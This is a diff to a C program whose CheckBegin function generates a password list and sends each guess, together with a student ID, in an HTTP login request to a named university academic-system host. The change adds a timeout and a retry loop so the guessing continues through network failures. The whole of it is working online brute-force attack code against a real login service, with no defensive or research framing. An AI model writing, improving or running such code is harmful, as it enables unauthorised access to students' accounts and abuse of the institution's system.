@@ -111,6 +111,8 @@ int CheckBegin(char *stuid,char *pwd)
 	register int i,Ftime=0;
 
 	/*套接字初始化部分*/
+	int timeout = 60000;//超时1分钟
+	int TimedOutFlag = 0;
 	WSADATA WSAData={0}; 
 	SOCKET sockinf; 
 	struct sockaddr_in addr; 
@@ -131,20 +133,25 @@ int CheckBegin(char *stuid,char *pwd)
 	addr.sin_family = AF_INET; 
 	addr.sin_addr.s_addr = *((unsigned long*)pURL->h_addr); 
 	addr.sin_port = htons(80); 
-
+	setsockopt(sockinf,SOL_SOCKET,SO_SNDTIMEO,(char*)&timeout,sizeof(int));//设置recv超时为1分钟
 
 	tnum = PwdNum = CreatePwdList(pwd,&PwdList);//生成密码表并返回个数
 	printf("\n共%d个待测试密码",PwdNum);
 	for (i=0;i<PwdNum;i++)
 	{
 		/*套接字初始化与查询分离为了加速*/
-		sockinf = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
-		sprintf(header,"GET /pls/wwwbks/bks_login2.login?stuid=%s&pwd=%s HTTP/1.1\r\nHost: jwgl.lnu.edu.cn\r\nConnection: Close\r\n\r\n",stuid,PwdList[i]);
-		connect(sockinf,(SOCKADDR *)&addr,sizeof(addr)); 
-		send(sockinf, header, strlen(header), 0); 
-		recv(sockinf, text, 20, 0);
-		sitebuf = text;
-		closesocket(sockinf); 
+		TimedOutFlag = 0;
+		do
+		{
+			sockinf = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
+			sprintf(header,"GET /pls/wwwbks/bks_login2.login?stuid=%s&pwd=%s HTTP/1.1\r\nHost: jwgl.lnu.edu.cn\r\nConnection: Close\r\n\r\n",stuid,PwdList[i]);
+			connect(sockinf,(SOCKADDR *)&addr,sizeof(addr)); 
+			send(sockinf,header,strlen(header),0); 
+			if (recv(sockinf,text,20,0) == -1)//捕获到超时
+				TimedOutFlag = 1;
+			sitebuf = text;
+			closesocket(sockinf);
+		}while(TimedOutFlag);//上一次超时
 
 		//sitebuf = QueryWebSite(stuid,PwdList[i]);//查询到的网页内容
 		if (!sitebuf)//若为空，失败次数+1
